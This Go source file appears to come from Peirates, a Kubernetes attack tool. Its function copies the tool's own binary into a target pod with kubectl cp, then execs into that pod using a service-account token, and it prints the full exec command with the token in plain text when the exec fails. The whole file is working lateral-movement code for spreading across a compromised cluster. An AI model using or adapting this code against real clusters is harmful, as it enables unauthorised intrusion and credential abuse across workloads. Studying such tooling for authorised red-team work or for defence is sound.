package peirates

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
	if !kubectlAuthCanI(connectionString, "exec", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to exec into pods")
		return
	}

	println("[+] ALPHA Feature: Transferring a copy of Peirates into pod:", pod)

	// First, try copying the binary in via a kubectl cp command.
	filename := os.Getenv("_")
	destination := pod + ":/tmp"

	copyIntoPod, _, err := runKubectlSimple(connectionString, "cp", filename, destination)
	if err != nil {
		fmt.Printf("[-] Copying peirates into pod %s failed.\n", pod)
	} else {
		println(string(copyIntoPod))
		println("[+] Transfer successful")

		// println("Do you wish to [1] move entirely into that pod OR [2] be given a copy-pastable command so you can keep this peirates instance?")
		// Feature request: give the user the option to exec into the next pod.
		// $_
		// runKubectlSimple (exec -it pod /tmp/peirates)

		// println("Option 2 is: ")
		// CA path
		caPath := "--certificate-authority=" + connectionString.CAPath
		args := []string{"kubectl", "--token", connectionString.Token, caPath, "-n", connectionString.Namespace, "exec", "-it", pod, "--", "/tmp/peirates"}

		path, lookErr := exec.LookPath("kubectl")
		if lookErr != nil {
			println("kubectl not found in the PATH in this pod. You can correct this and try again. Alternatively:\n")
			println("Start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
			println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
		} else {
			env := os.Environ()
			execErr := syscall.Exec(path, args, env)
			if execErr != nil {
				println("[-] Exec failed - try manually, as below.\n")
				println("Start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
				println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
			}
		}
	}
}
